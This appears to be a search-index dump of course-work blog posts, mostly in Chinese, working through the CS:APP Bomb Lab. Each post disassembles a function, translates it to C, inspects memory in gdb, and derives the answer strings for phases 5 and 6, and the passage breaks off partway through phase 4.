"2022-04-04 00:00:00 +0800", "snippet": "0000000000401893 &lt;strings_not_equal&gt;: 401893:\t41 54 \tpush %r12 401895:\t55 \tpush %rbp 401896:\t53 \tpush %rbx 401897:\t48 89 fb \tmov %rdi,%rbx 40189a:\t48 89 f5 \tmov %rsi,%rbp 40189d:\te8 d4 ff ff ff \tcallq 401876 &lt;string_length&gt; 4018a2:\t41 89 c4 \tmov %eax,%r12d 4018a5:\t48 89 ef \tmov %rbp,%rdi 4018a8:\te8 c9 ff ff ff \tcallq 401876 &lt;string_length&gt; 4018ad:\tba 01 00 00 00 \tmov $0x1,%edx 4018b2:\t41 39 c4 \tcmp %eax,%r12d 4018b5:\t75 3c \tjne 4018f3 &lt;strings_not_equal+0x60&gt; 4018b7:\t0f b6 03 \tmovzbl (%rbx),%eax 4018ba:\t84 c0 \ttest %al,%al 4018bc:\t74 22 \tje 4018e0 &lt;strings_not_equal+0x4d&gt; 4018be:\t3a 45 00 \tcmp 0x0(%rbp),%al 4018c1:\t74 07 \tje 4018ca &lt;strings_not_equal+0x37&gt; 4018c3:\teb 22 \tjmp 4018e7 &lt;strings_not_equal+0x54&gt; 4018c5:\t3a 45 00 \tcmp 0x0(%rbp),%al 4018c8:\t75 24 \tjne 4018ee &lt;strings_not_equal+0x5b&gt; 4018ca:\t48 83 c3 01 \tadd $0x1,%rbx 4018ce:\t48 83 c5 01 \tadd $0x1,%rbp 4018d2:\t0f b6 03 \tmovzbl (%rbx),%eax 4018d5:\t84 c0 \ttest %al,%al 4018d7:\t75 ec \tjne 4018c5 &lt;strings_not_equal+0x32&gt; 4018d9:\tba 00 00 00 00 \tmov $0x0,%edx 4018de:\teb 13 \tjmp 4018f3 &lt;strings_not_equal+0x60&gt; 4018e0:\tba 00 00 00 00 \tmov $0x0,%edx 4018e5:\teb 0c \tjmp 4018f3 &lt;strings_not_equal+0x60&gt; 4018e7:\tba 01 00 00 00 \tmov $0x1,%edx 4018ec:\teb 05 \tjmp 4018f3 &lt;strings_not_equal+0x60&gt; 4018ee:\tba 01 00 00 00 \tmov $0x1,%edx 4018f3:\t89 d0 \tmov %edx,%eax 4018f5:\t5b \tpop %rbx 4018f6:\t5d \tpop %rbp 4018f7:\t41 5c \tpop %r12 4018f9:\tc3 \tretq分割 BasicBlock0000000000401893 &lt;strings_not_equal&gt;:b0: 401893:\t41 54 \tpush %r12 401895:\t55 \tpush %rbp 401896:\t53 \tpush %rbx 401897:\t48 89 fb \tmov %rdi,%rbx 40189a:\t48 89 f5 \tmov %rsi,%rbp 40189d:\te8 d4 ff ff ff \tcallq 401876 &lt;string_length&gt; 4018a2:\t41 89 c4 \tmov %eax,%r12d 4018a5:\t48 89 ef \tmov %rbp,%rdi 4018a8:\te8 c9 ff ff ff \tcallq 401876 &lt;string_length&gt; 4018ad:\tba 01 00 00 00 \tmov $0x1,%edx 4018b2:\t41 39 c4 \tcmp %eax,%r12d 4018b5:\t75 3c \tjne 4018f3 &lt;strings_not_equal+0x60&gt; 4018b7:\t0f b6 03 \tmovzbl (%rbx),%eax 4018ba:\t84 c0 \ttest %al,%al 4018bc:\t74 22 \tje 4018e0 &lt;strings_not_equal+0x4d&gt; 4018be:\t3a 45 00 \tcmp 0x0(%rbp),%al 4018c1:\t74 07 \tje 4018ca &lt;strings_not_equal+0x37&gt; 4018c3:\teb 22 \tjmp 4018e7 &lt;strings_not_equal+0x54&gt;b1: 4018c5:\t3a 45 00 \tcmp 0x0(%rbp),%al 4018c8:\t75 24 \tjne 4018ee &lt;strings_not_equal+0x5b&gt;b2: 4018ca:\t48 83 c3 01 \tadd $0x1,%rbx 4018ce:\t48 83 c5 01 \tadd $0x1,%rbp 4018d2:\t0f b6 03 \tmovzbl (%rbx),%eax 4018d5:\t84 c0 \ttest %al,%al 4018d7:\t75 ec \tjne 4018c5 &lt;strings_not_equal+0x32&gt; 4018d9:\tba 00 00 00 00 \tmov $0x0,%edx 4018de:\teb 13 \tjmp 4018f3 &lt;strings_not_equal+0x60&gt;b3: 4018e0:\tba 00 00 00 00 \tmov $0x0,%edx 4018e5:\teb 0c \tjmp 4018f3 &lt;strings_not_equal+0x60&gt;b4: 4018e7:\tba 01 00 00 00 \tmov $0x1,%edx 4018ec:\teb 05 \tjmp 4018f3 &lt;strings_not_equal+0x60&gt;b5: 4018ee:\tba 01 00 00 00 \tmov $0x1,%edxb6: 4018f3:\t89 d0 \tmov %edx,%eax 4018f5:\t5b \tpop %rbx 4018f6:\t5d \tpop %rbp 4018f7:\t41 5c \tpop %r12 4018f9:\tc3 \tretq翻译为 Cvoid strings_not_equal() {b0: // push r12 rbp rbx rbx = rdi; rbp = rsi; rax = string_length(rdi); r12 = rax; // 32-bit rdi = rbp; rax = string_length(rdi); rdx = 1; // 32-bit if (r12 != rax) // 32-bit goto b6; rax = *rbx; // 32-bit if (rax == 0) // 8-bit goto b3; if (rax == *rbp) // 8-bit goto b2; goto b4;b1: if (rax != *rbp) // 8-bit goto b5;b2: ++rbx; ++rbp; rax = *rbx; // 32-bit if (rax != 0) // 8-bit goto b1; rdx = 0; // 32-bit goto b6;b3: rdx = 0; // 32-bit goto b6;b4: rdx = 1; // 32-bit goto b6;b5: rdx = 1; // 32-bitb6: rax = rdx; // 32-bit // pop rbx rbp r12 return;}Optimizeint strings_not_equal(char* rdi, char* rsi) { if (string_length(rdi) != string_length(rsi)) return 1; for (char *rbx = rdi, *rbp = rsi; *rbx; ++rbx, ++rbp) { if (*rbx != *rbp) return 1; } return 0;}" }, { "title": "Bomb Lab: string length", "url": "/course-work/computer-organization-and-architecture/2022/04/04/string_length/", "categories": "Course Work, Computer Organization and Architecture", "tags": "Bomb Lab", "date": "2022-04-04 00:00:00 +0800", "snippet": "Assembly0000000000401876 &lt;string_length&gt;:b0: 401876:\t80 3f 00 \tcmpb $0x0,(%rdi) 401879:\t74 12 \tje 40188d &lt;string_length+0x17&gt; 40187b:\t48 89 fa \tmov %rdi,%rdxb1: 40187e:\t48 83 c2 01 \tadd $0x1,%rdx 401882:\t89 d0 \tmov %edx,%eax 401884:\t29 f8 \tsub %edi,%eax 401886:\t80 3a 00 \tcmpb $0x0,(%rdx) 401889:\t75 f3 \tjne 40187e &lt;string_length+0x8&gt; 40188b:\tf3 c3 \trepz retqb2: 40188d:\tb8 00 00 00 00 \tmov $0x0,%eax 401892:\tc3 \tretq翻译为 Cvoid string_length() void string_length() {b0: if (*rdi == 0) goto b2; rdx = rdi;b1: ++rdx; rax = rdx; // 32-bit rax -= rdi; // 32-bit if (*rdx != 0) goto b1; return;b2: rax = 0; // 32-bit return;}Optimizeint string_length(char* rdi) { char* rdx = rdi; while (*rdx) ++rdi; return rdx - rdi; // rax}" }, { "title": "Bomb Lab: read six numbers", "url": "/course-work/computer-organization-and-architecture/2022/04/04/read_six_numbers/", "categories": "Course Work, Computer Organization and Architecture", "tags": "Bomb Lab", "date": "2022-04-04 00:00:00 +0800", "snippet": "Assembly0000000000401b98 &lt;read_six_numbers&gt;:b0: 401b98:\t48 83 ec 18 \tsub $0x18,%rsp 401b9c:\t48 89 f2 \tmov %rsi,%rdx 401b9f:\t48 8d 4e 04 \tlea 0x4(%rsi),%rcx 401ba3:\t48 8d 46 14 \tlea 0x14(%rsi),%rax 401ba7:\t48 89 44 24 08 \tmov %rax,0x8(%rsp) 401bac:\t48 8d 46 10 \tlea 0x10(%rsi),%rax 401bb0:\t48 89 04 24 \tmov %rax,(%rsp) 401bb4:\t4c 8d 4e 0c \tlea 0xc(%rsi),%r9 401bb8:\t4c 8d 46 08 \tlea 0x8(%rsi),%r8 401bbc:\t48 8d 35 66 18 00 00 \tlea 0x1866(%rip),%rsi # 403429 &lt;array.3354+0x249&gt; 401bc3:\tb8 00 00 00 00 \tmov $0x0,%eax 401bc8:\te8 63 f5 ff ff \tcallq 401130 &lt;__isoc99_sscanf@plt&gt; 401bcd:\t83 f8 05 \tcmp $0x5,%eax 401bd0:\t7f 05 \tjg 401bd7 &lt;read_six_numbers+0x3f&gt; 401bd2:\te8 85 ff ff ff \tcallq 401b5c &lt;explode_bomb&gt;b1: 401bd7:\t48 83 c4 18 \tadd $0x18,%rsp 401bdb:\tc3 \tretq翻译为 Cvoid read_six_numbers() {b0: rsp -= 0x18; rdx = rsi; rcx = rsi + 0x4; rax = rsi + 0x14; *(rsp + 0x8) = rax; rax = rsi + 0x10; *rsp = rax; r9 = rsi + 0xc; r8 = rsi + 0x8; rsi = 0x403429; // 403429 &lt;array.3354+0x249&gt; rax = 0; // 32-bit rax = __isoc99_sscanf @plt(); if (rax &gt; 0x5) goto b1; explode_bomb();b1: rsp += 0x18; return;}Optimizevoid read_six_numbers(char* rdi, int* rsi) { int rax = 0; // 32-bit rax = __isoc99_sscanf(rdi, \"%d %d %d %d %d %d\", rsi, rsi + 1, rsi + 2, rsi + 3, rsi + 4, rsi + 5); if (!(rax &gt; 5)) explode_bomb();}Hack(gdb) x/s 0x4034290x403429: \"%d %d %d %d %d %d\"" }, { "title": "Bomb Lab: Phase 6", "url": "/course-work/computer-organization-and-architecture/2022/04/04/phase_6/", "categories": "Course Work, Computer Organization and Architecture", "tags": "Bomb Lab", "date": "2022-04-04 00:00:00 +0800", "snippet": "Assembly0000000000401641 &lt;phase_6&gt;:b0: 401641:\t41 56 \tpush %r14 401643:\t41 55 \tpush %r13 401645:\t41 54 \tpush %r12 401647:\t55 \tpush %rbp 401648:\t53 \tpush %rbx 401649:\t48 83 ec 50 \tsub $0x50,%rsp 40164d:\t49 89 e5 \tmov %rsp,%r13 401650:\t48 89 e6 \tmov %rsp,%rsi 401653:\te8 40 05 00 00 \tcallq 401b98 &lt;read_six_numbers&gt; 401658:\t49 89 e6 \tmov %rsp,%r14 40165b:\t41 bc 00 00 00 00 \tmov $0x0,%r12db1: 401661:\t4c 89 ed \tmov %r13,%rbp 401664:\t41 8b 45 00 \tmov 0x0(%r13),%eax 401668:\t83 e8 01 \tsub $0x1,%eax 40166b:\t83 f8 05 \tcmp $0x5,%eax 40166e:\t76 05 \tjbe 401675 &lt;phase_6+0x34&gt;b2: 401670:\te8 e7 04 00 00 \tcallq 401b5c &lt;explode_bomb&gt;b3: 401675:\t41 83 c4 01 \tadd $0x1,%r12d 401679:\t41 83 fc 06 \tcmp $0x6,%r12d 40167d:\t74 21 \tje 4016a0 &lt;phase_6+0x5f&gt;b4: 40167f:\t44 89 e3 \tmov %r12d,%ebxb5: 401682:\t48 63 c3 \tmovslq %ebx,%rax 401685:\t8b 04 84 \tmov (%rsp,%rax,4),%eax 401688:\t39 45 00 \tcmp %eax,0x0(%rbp) 40168b:\t75 05 \tjne 401692 &lt;phase_6+0x51&gt;b6: 40168d:\te8 ca 04 00 00 \tcallq 401b5c &lt;explode_bomb&gt;b7: 401692:\t83 c3 01 \tadd $0x1,%ebx 401695:\t83 fb 05 \tcmp $0x5,%ebx 401698:\t7e e8 \tjle 401682 &lt;phase_6+0x41&gt;b8: 40169a:\t49 83 c5 04 \tadd $0x4,%r13 40169e:\teb c1 \tjmp 401661 &lt;phase_6+0x20&gt;b9: 4016a0:\t48 8d 74 24 18 \tlea 0x18(%rsp),%rsi 4016a5:\t4c 89 f0 \tmov %r14,%rax 4016a8:\tb9 07 00 00 00 \tmov $0x7,%ecxb10: 4016ad:\t89 ca \tmov %ecx,%edx 4016af:\t2b 10 \tsub (%rax),%edx 4016b1:\t89 10 \tmov %edx,(%rax) 4016b3:\t48 83 c0 04 \tadd $0x4,%rax 4016b7:\t48 39 f0 \tcmp %rsi,%rax 4016ba:\t75 f1 \tjne 4016ad &lt;phase_6+0x6c&gt;b11: 4016bc:\tbe 00 00 00 00 \tmov $0x0,%esi 4016c1:\teb 23 \tjmp 4016e6 &lt;phase_6+0xa5&gt;b12: 4016c3:\t48 8b 52 08 \tmov 0x8(%rdx),%rdx 4016c7:\t83 c0 01 \tadd $0x1,%eax 4016ca:\t39 c8 \tcmp %ecx,%eax 4016cc:\t75 f5 \tjne 4016c3 &lt;phase_6+0x82&gt;b13: 4016ce:\teb 07 \tjmp 4016d7 &lt;phase_6+0x96&gt;b14: 4016d0:\t48 c7 c2 20 53 40 00 \tmov $0x405320,%rdxb15: 4016d7:\t48 89 54 74 20 \tmov %rdx,0x20(%rsp,%rsi,2) 4016dc:\t48 83 c6 04 \tadd $0x4,%rsi 4016e0:\t48 83 fe 18 \tcmp $0x18,%rsi 4016e4:\t74 16 \tje 4016fc &lt;phase_6+0xbb&gt;b16: 4016e6:\t8b 0c 34 \tmov (%rsp,%rsi,1),%ecx 4016e9:\t83 f9 01 \tcmp $0x1,%ecx 4016ec:\t7e e2 \tjle 4016d0 &lt;phase_6+0x8f&gt;b17: 4016ee:\tb8 01 00 00 00 \tmov $0x1,%eax 4016f3:\t48 c7 c2 20 53 40 00 \tmov $0x405320,%rdx 4016fa:\teb c7 \tjmp 4016c3 &lt;phase_6+0x82&gt;b18: 4016fc:\t48 8b 5c 24 20 \tmov 0x20(%rsp),%rbx 401701:\t48 8d 44 24 28 \tlea 0x28(%rsp),%rax 401706:\t48 8d 74 24 50 \tlea 0x50(%rsp),%rsi 40170b:\t48 89 d9 \tmov %rbx,%rcxb19: 40170e:\t48 8b 10 \tmov (%rax),%rdx 401711:\t48 89 51 08 \tmov %rdx,0x8(%rcx) 401715:\t48 83 c0 08 \tadd $0x8,%rax 401719:\t48 39 f0 \tcmp %rsi,%rax 40171c:\t74 05 \tje 401723 &lt;phase_6+0xe2&gt;b20: 40171e:\t48 89 d1 \tmov %rdx,%rcx 401721:\teb eb \tjmp 40170e &lt;phase_6+0xcd&gt;b21: 401723:\t48 c7 42 08 00 00 00 \tmovq $0x0,0x8(%rdx) 40172a:\t00 40172b:\tbd 05 00 00 00 \tmov $0x5,%ebpb22: 401730:\t48 8b 43 08 \tmov 0x8(%rbx),%rax 401734:\t8b 00 \tmov (%rax),%eax 401736:\t39 03 \tcmp %eax,(%rbx) 401738:\t7d 05 \tjge 40173f &lt;phase_6+0xfe&gt;b23: 40173a:\te8 1d 04 00 00 \tcallq 401b5c &lt;explode_bomb&gt;b24: 40173f:\t48 8b 5b 08 \tmov 0x8(%rbx),%rbx 401743:\t83 ed 01 \tsub $0x1,%ebp 401746:\t75 e8 \tjne 401730 &lt;phase_6+0xef&gt;b25: 401748:\t48 83 c4 50 \tadd $0x50,%rsp 40174c:\t5b \tpop %rbx 40174d:\t5d \tpop %rbp 40174e:\t41 5c \tpop %r12 401750:\t41 5d \tpop %r13 401752:\t41 5e \tpop %r14 401754:\tc3 \tretq翻译为 Cvoid phase_6(char* rdi) {b0: rsp -= 0x50; int* r13 = rsp; int* rsi = rsp; read_six_numbers(rdi, rsi); int* r14 = rsp; int r12 = 0;b1: int* rbp = r13; int rax = *r13; if (--rax &lt;= 5) goto b3;b2: explode_bomb();b3: if (++r12 == 6) goto b9;b4: int rbx = r12;b5: rax = rsp[rbx]; if (*rbp != rax) goto b7;b6: explode_bomb();b7: if (++rbx &lt;= 0x5) goto b5;b8: r13 += 0x4; goto b1;b9: rsi = rsp + 0x18; rax = r14; int rcx = 7;b10: int rdx = rcx; rdx -= *rax; *rax = rdx; rax += 0x4; if (rax != rsi) goto b10;b11: int rsi = 0; goto b16;b12: rdx = *(rdx + 0x8); if (++rax != rcx) goto b12;b13: goto b15;b14: rdx = 0x405320;b15: *(rsp + rsi * 2 + 0x20) = rdx; rsi += 0x4; if (rsi == 0x18) goto b18;b16: int rcx = *(rsp + rsi * 1); if (rcx &lt;= 1) goto b14;b17: int rax = 1; rdx = 0x405320; goto b12;b18: rbx = *(rsp + 0x20); rax = rsp + 0x28; rsi = rsp + 0x50; rcx = rbx;b19: rdx = *rax; *(rcx + 0x8) = rdx; rax += 0x8; if (rax == rsi) goto b21;b20: rcx = rdx; goto b19;b21: *(rdx + 0x8) = 0; int rbp = 0x5;b22: rax = *(rbx + 0x8); int rax = *rax; // 32-bit if (*rbx &gt;= rax) // 32-bit goto b24;b23: explode_bomb();b24: rbx = *(rbx + 0x8); if (--rbp != 0) // 32-bit goto b22;b25: rsp += 0x50; return;}State GraphstateDiagram-v2 b0 --&gt; b1 b1 --&gt; b3: --rax &lt;= 5 b1 --&gt; b2: else b2 --&gt; b3 b3 --&gt; b9: ++r12 == 6 b3 --&gt; b4: else b4 --&gt; b5 b5 --&gt; b7: *rbp != rax b5 --&gt; b6: else b6 --&gt; b7 b7 --&gt; b5: ++rbx &lt;= 5 b7 --&gt; b8: else b8 --&gt; b1 b9 --&gt; b10 b10 --&gt; b10: rax != rsi b10 --&gt; b11: else b11 --&gt; b16 b12 --&gt; b12: ++rax != rcx b12 --&gt; b13: else b13 --&gt; b15 b14 --&gt; b15 b15 --&gt; b18: rsi == 0x18 b15 --&gt; b16: else b16 --&gt; b14: rcx &lt;= 1 b16 --&gt; b17: else b17 --&gt; b12 b18 --&gt; b19 b19 --&gt; b21: rax == rsi b19 --&gt; b20: else b20 --&gt; b19 b21 --&gt; b22 b22 --&gt; b24: *rbx &gt;= rax b22 --&gt; b23: else b23 --&gt; b24 b24 --&gt; b22: --rbp != 0 b24 --&gt; b25: elseOptimizevoid phase_6(char* rdi) { b0; while (1) { b1; if (--rax &gt; 5) b2; b3; if (++r12 == 6) break; b4; do { b5; if (*rbp == rax) b6; b7; } while (++rbx &lt;= 5); b8; } b9; do { b10; } while (rax != rsi); b11; do { b16; if (rcx &lt;= 1) { b14; } else { b17; do { b12; } while (++rax != rcx); b13; } b15; } while (rsi != 0x18); b18; while (1) { b19; if (rax == rsi) break; b20; } b21; do { b22; if (*rbx &lt; rax) b23; b24; } while (--rbp != 0); b25;}Optimizevoid phase_6(char* rdi) { rsp -= 0x50; r13 = rsp; rsi = rsp; read_six_numbers(rdi, rsi); r14 = rsp; r12 = 0; while (1) { rbp = r13; rax = r13; if (--rax &gt; 5) explode_bomb(); if (++r12 == 6) break; rbx = r12; do { if (*rbp == rax) explode_bomb(); } while (++rbx &lt;= 5); r13 += 4; } rsi = rsp + 0x18; rax = r14; rcx = 7; do { rdx = rcx; rdx -= *rax; *rax = rdx; rax += 4; } while (rax != rsi); rsi = 0; do { rcx = *(rsp + rsi * 1); if (rcx &lt;= 1) { rdx = 0x405320; } else { rax = 1; rdx = 0x405320; do { rdx = *(rdx + 8); } while (++rax != rcx); } *(rsp + rsi * 2 + 0x20) = rdx; rsi += 4; } while (rsi != 0x18); rbx = *(rsp + 0x20); rax = rsp + 0x28; rsi = rsp + 0x50; rcx = rbx; while (1) { rdx = *rax; *(rcx + 8) = rdx; rax += 8; if (rax == rsi) break; rcx = rdx; } *(rdx + 8) = 0; rbp = 5; do { rax = *(rbx + 8); rax = *rax; if (*rbx &lt; rax) explode_bomb(); rbx = *(rbx + 8); } while (--rbp != 0); rsp += 0x50;}Hack(gdb) x/16xg 0x4053200x405320 &lt;node1&gt;: 0x00000001000002f5 0x00000000000000000x405330 &lt;node2&gt;: 0x00000002000002c7 0x00000000004053400x405340 &lt;node3&gt;: 0x0000000300000374 0x00000000004053500x405350 &lt;node4&gt;: 0x000000040000029a 0x00000000004053600x405360 &lt;node5&gt;: 0x00000005000002c2 0x00000000004052000x405370: 0x0000000000000000 0x00000000000000000x405380 &lt;completed.7098&gt;: 0x0000000000000000 0x00000000000000000x405390: 0x0000000000000000 0x0000000000000000(gdb) x/32xw 0x4053200x405320 &lt;node1&gt;: 0x000002f5 0x00000001 0x00000000 0x000000000x405330 &lt;node2&gt;: 0x000002c7 0x00000002 0x00405340 0x000000000x405340 &lt;node3&gt;: 0x00000374 0x00000003 0x00405350 0x000000000x405350 &lt;node4&gt;: 0x0000029a 0x00000004 0x00405360 0x000000000x405360 &lt;node5&gt;: 0x000002c2 0x00000005 0x00405200 0x000000000x405370: 0x00000000 0x00000000 0x00000000 0x000000000x405380 &lt;completed.7098&gt;: 0x00000000 0x00000000 0x00000000 0x000000000x405390: 0x00000000 0x00000000 0x00000000 0x00000000(gdb) x/4xg 0x4052000x405200 &lt;node6&gt;: 0x00000006000000a1 0x00000000000000000x405210 &lt;user_password&gt;: 0x64496d4a50745575 0x4c75456b5a5a4744(gdb) x/8xw 0x4052000x405200 &lt;node6&gt;: 0x000000a1 0x00000006 0x00405320 0x000000000x405210 &lt;user_password&gt;: 0x50745575 0x64496d4a 0x5a5a4744 0x4c75456b Address a b next 0x405320 &lt;node1&gt; 0x2f5 1 0x0000000000405330 &lt;node2&gt; 0x405330 &lt;node2&gt; 0x2c7 2 0x0000000000405340 &lt;node3&gt; 0x405340 &lt;node3&gt; 0x374 3 0x0000000000405350 &lt;node4&gt; 0x405350 &lt;node4&gt; 0x29a 4 0x0000000000405360 &lt;node5&gt; 0x405360 &lt;node5&gt; 0x2c2 5 0x0000000000405200 &lt;node6&gt; 0x405200 &lt;node6&gt; 0x0a1 0 0x0000000000000000 &lt;NULL&gt; Optimizestruct Node { int a, b; struct Node* next;};void phase_6(char* rdi) { int rsp[6]; // rsp + 0x00 -- rsp + 0x18 struct Node* rsp1[6]; // rsp + 0x20 -- rsp + 0x50 read_six_numbers(rdi, rsp); for (int r12 = 0; r12 != 6; ++r12) { if (rsp[r12] - 1 &gt; 5) explode_bomb(); for (int rbx = r12; rbx &lt;= 5; ++rbx) { if (rsp[r12] == rsp[rbx]) explode_bomb(); } } for (int* rax = rsp; rax != rsp + 6; ++rax) *rax = 7 - *rax; for (int rsi = 0; rsi != 6; ++rsi) { struct Node* rdx = 0x405320; for (int rax = 1; rax &lt; rsp[rsi]; ++rax) rdx = rdx-&gt;next; rsp1[rsi] = rdx; } struct Node* rcx = rsp1[0]; for (struct Node** rax = rsp1; rax != rsp1 + 6; ++rax) { rcx-&gt;next = *rax; rcx = *rax; } rsp1[5]-&gt;next = 0; struct Node* rbx = rsp1[0]; for (int rbp = 5; rbp != 0; --rbp) { if (rbx-&gt;a &lt; rbx-&gt;next-&gt;a) explode_bomb(); rbx = rbx-&gt;next; }}Analysis从地址中可以分析出, phase_6 使用到了结构体, 猜想其结构如 struct Node 所示, 表示链表. read_six_numbers(rdi, rsp);不难发现, phase_6 需要输入 6 个 int, 记为 rsp[i]. for (int r12 = 0; r12 != 6; ++r12) { if (rsp[r12] - 1 &gt; 5) explode_bomb(); for (int rbx = r12; rbx &lt;= 5; ++rbx) { if (rsp[r12] == rsp[rbx]) explode_bomb(); } }检查输入的 6 个数均 &lt; 7, 且不重复. for (int* rax = rsp; rax != rsp + 6; ++rax) *rax = 7 - *rax;将输入的 6 个数用 7 减去, 得到新的 6 个数 rsp[i] = 7 - rsp[i]. for (int rsi = 0; rsi != 6; ++rsi) { struct Node* rdx = 0x405320; for (int rax = 1; rax &lt; rsp[rsi]; ++rax) rdx = rdx-&gt;next; rsp1[rsi] = rdx; }将链表的第 rsp[i] 个结点的指针存入 rsp1 内. struct Node* rcx = rsp1[0]; for (struct Node** rax = rsp1; rax != rsp1 + 6; ++rax) { rcx-&gt;next = *rax; rcx = *rax; } rsp1[5]-&gt;next = 0;对链表进行重排序, 按照 rsp[i] 指定的顺序排序. int rbp = 5; for (struct Node* rbx = rsp1[0]; rbp != 0; --rbp) { if (rbx-&gt;a &lt; rbx-&gt;next-&gt;a) explode_bomb(); rbx = rbx-&gt;next; }检查排序后的链表是否满足非升序.Solution基于前文 Hack 中得到的数据, 我们可以给出初始时列表元素的值为[0x2f5, 0x2c7, 0x374, 0x29a, 0x2c2, 0x0a1]为保证列表按非升序排列, 正确的排列为3 1 2 5 4 6又因为过程中进行了 rsp[i] = 7 - rsp[i] 的变换, 因此正确的输入为4 6 5 2 3 1" }, { "title": "Bomb Lab: Phase 5", "url": "/course-work/computer-organization-and-architecture/2022/04/04/phase_5/", "categories": "Course Work, Computer Organization and Architecture", "tags": "Bomb Lab", "date": "2022-04-04 00:00:00 +0800", "snippet": "Assembly00000000004015fc &lt;phase_5&gt;:b0: 4015fc:\t53 \tpush %rbx 4015fd:\t48 89 fb \tmov %rdi,%rbx 401600:\te8 71 02 00 00 \tcallq 401876 &lt;string_length&gt; 401605:\t83 f8 06 \tcmp $0x6,%eax 401608:\t74 05 \tje 40160f &lt;phase_5+0x13&gt; 40160a:\te8 4d 05 00 00 \tcallq 401b5c &lt;explode_bomb&gt;b1: 40160f:\tb8 00 00 00 00 \tmov $0x0,%eax 401614:\tba 00 00 00 00 \tmov $0x0,%edxb2: 401619:\t0f b6 34 03 \tmovzbl (%rbx,%rax,1),%esi 40161d:\t83 e6 0f \tand $0xf,%esi 401620:\t48 8d 0d b9 1b 00 00 \tlea 0x1bb9(%rip),%rcx # 4031e0 &lt;array.3354&gt; 401627:\t03 14 b1 \tadd (%rcx,%rsi,4),%edx 40162a:\t48 83 c0 01 \tadd $0x1,%rax 40162e:\t48 83 f8 06 \tcmp $0x6,%rax 401632:\t75 e5 \tjne 401619 &lt;phase_5+0x1d&gt; 401634:\t83 fa 40 \tcmp $0x40,%edx 401637:\t74 05 \tje 40163e &lt;phase_5+0x42&gt; 401639:\te8 1e 05 00 00 \tcallq 401b5c &lt;explode_bomb&gt;b3: 40163e:\t5b \tpop %rbx 40163f:\t90 \tnop 401640:\tc3 \tretq翻译为 Cvoid phase_5(char* rdi) {b0: rbx = rdi; rax = string_length(rdi); if (rax == 6) // 32-bit goto b1; explode_bomb();b1: rax = 0; // 32-bit rdx = 0; // 32-bitb2: rsi = *(rbx + rax); // 32-bit rsi &amp;= 0xf; // 32-bit rcx = 0x4031e0; // 4031e0 &lt;array.3354&gt; rdx += *(rcx + rsi * 4); // 32-bit ++rax; if (rax != 0x6) goto b2; if (rdx == 0x40) goto b3; explode_bomb();b3: return;}Hack(gdb) x/16xw 0x4031e00x4031e0 &lt;array.3354&gt;: 0x00000002 0x0000000a 0x00000006 0x000000010x4031f0 &lt;array.3354+16&gt;: 0x0000000c 0x00000010 0x00000009 0x000000030x403200 &lt;array.3354+32&gt;: 0x00000004 0x00000007 0x0000000e 0x000000050x403210 &lt;array.3354+48&gt;: 0x0000000b 0x00000008 0x0000000f 0x0000000dOptimizevoid phase_5(char* rdi) { if (string_length(rdi) != 6) explode_bomb(); int rdx = 0; for (int rax = 0; rax != 6; ++rax) { int rsi = rdi[rax] &amp; 0xf; int* rcx = { 0x00000002, 0x0000000a, 0x00000006, 0x00000001, 0x0000000c, 0x00000010, 0x00000009, 0x00000003, 0x00000004, 0x00000007, 0x0000000e, 0x00000005, 0x0000000b, 0x00000008, 0x0000000f, 0x0000000d, }; rdx += rcx[rsi]; } if (rdx != 0x40) explode_bomb(); return;}Solution构造长度为 6 的字符串, 使得最终 rdx == 0x40 即可. 例如0x40 = 64 = 10 + 10 + 11 + 11 + 11 + 11则 rdi 应满足(rdi[0, 1] &amp; 0xf) == 1(rdi[2, 3, 4, 5] &amp; 0xf) == 12也即(rdi[0, 1] % 16) == 1(rdi[2, 3, 4, 5] % 16) == 12不妨取rdi[0, 1] = 'a' = 97rdi[2, 3, 4, 5] = 'l' = 108得到aallll" }, { "title": "Bomb Lab: Phase 4", "url": "/course-work/computer-organization-and-architecture/2022/04/04/phase_4/", "categories": "Course Work, Computer Organization and Architecture", "tags": "Bomb Lab", "date": "2022-04-04 00:00:00 +0800", "snippet": "Assembly00000000004015a9 &lt;phase_4&gt;:b0: 4015a9:\t48 83 ec 18 \tsub $0x18,%rsp 4015ad:\t48 8d 4c 24 08 \tlea 0x8(%rsp),%rcx 4015b2:\t48 8d 54 24 0c \tlea 0xc(%rsp),%rdx 4015b7:\t48 8d 35 77 1e 00 00 \tlea 0x1e77(%rip),%rsi # 403435 &lt;array.3354+0x255&gt; 4015be:\tb8 00 00 00 00 \tmov $0x0,%eax 4015c3:\te8 68 fb ff ff \tcallq 401130 &lt;__isoc99_sscanf@plt&gt; 4015c8:\t83 f8 02 \tcmp $0x2,%eax 4015cb:\t75 0c \tjne 4015d9 &lt;phase_4+0x30&gt; 4015cd:\t8b 44 24 08 \tmov 0x8(%rsp),%eax 4015d1:\t83 e8 02 \tsub $0x2,%eax 4015d4:\t83 f8 02 \tcmp $0x2,%eax 4015d7:\t76 05 \tjbe 4015de &lt;phase_4+0x35&gt;b1: 4015d9:\te8 7e 05 00 00 \tcallq 401b5c &lt;explode_bomb&gt;b2: 4015de:\t8b 74 24 08 \tmov 0x8(%rsp),%esi 4015e2:\tbf 09 00 00 00 \tmov $0x9,%edi 4015e7:\te8 85 ff ff ff \tcallq 401571 &lt;func4&gt; 4015ec:\t3b 44 24 0c \tcmp 0xc(%rsp),%eax 4015f0:\t74 05 \tje 4015f7 &lt;phase_4+0x4e&gt; 4015f2:\te8 65 05 00 00 \tcallq 401b5c &lt;explode_bomb&gt;b3: 4015f7:\t48 83 c4 18 \tadd $0x18,%rsp 4015fb:\tc3 \tretqHack(gdb) x/s 0x4034350x403435: \"%d %d\"翻译为 Cvoid phase_4(char* rdi) {b0: int rsp[6]; rcx = rsp + 2; rdx = rsp + 3; rsi = \"%d %d\"; rax = 0; // 32-bit rax = __isoc99_sscanf(rdi, rsi, rdx, rcx); if (rax != 2) // 32-bit goto b1; rax = rsp[2]; // 32-bit rax -= 2; if (rax &lt;= 2) // 32-bit goto b2;b1: explode_bomb();b2: rsi = rsp[2]; // 32-bit rdi = 9; // 32-bit rax = fun4(); if (rax == rsp[3]) // 32-bit goto b3; explode_bomb();b3: return;}Optimizevoid phase_4(char* rdi) {b0: int rsp[6]; int rax = 0; rax = __isoc99_sscanf(rdi, \"%d %d\", rsp + 3, rsp + 2); if (rax != 2) goto b1; if (rsp[2] - 2 &lt;= 2) // unsigned goto b2;b1: explode_bomb();b2: rax = func4(9, rsp[2]); if (rax == rsp[3]) goto b3; explode_bomb();b3: return;}Hack输入 x, y, 只需满足 func4(9, y) == x 即可. 注意到运行过程中存在无符号比较, 